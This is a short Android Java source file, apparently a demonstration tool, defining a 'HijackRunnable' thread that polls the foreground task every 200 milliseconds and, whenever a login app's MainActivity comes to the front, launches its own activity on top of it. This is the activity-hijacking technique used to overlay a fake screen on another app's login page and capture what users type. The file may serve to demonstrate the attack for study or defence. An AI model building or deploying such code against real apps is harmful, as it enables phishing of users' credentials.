package com.example.tools.thread;

import java.util.List;

import com.example.tools.MainActivity;

import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;


/**
 * 
 * @author Jay-Tang
 *拦截线程
 */
public class HijackRunnable implements Runnable {
    private Context context;
    private static boolean isContinue = true;

    public HijackRunnable(Context context) {
        this.context = context;
    }

    public static void setContinue(boolean c) {
        isContinue = c;
    }

    @Override
    public void run() {
        while (isContinue) {
            ActivityManager am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
            @SuppressWarnings("deprecation")
			List<ActivityManager.RunningTaskInfo> tasks = am.getRunningTasks(1);
            if ("com.example.login.MainActivity".equals(tasks.get(0).topActivity.getClassName())) {
                Intent intent = new Intent(context, MainActivity.class);
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
            }
            try {
                Thread.sleep(200);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }
}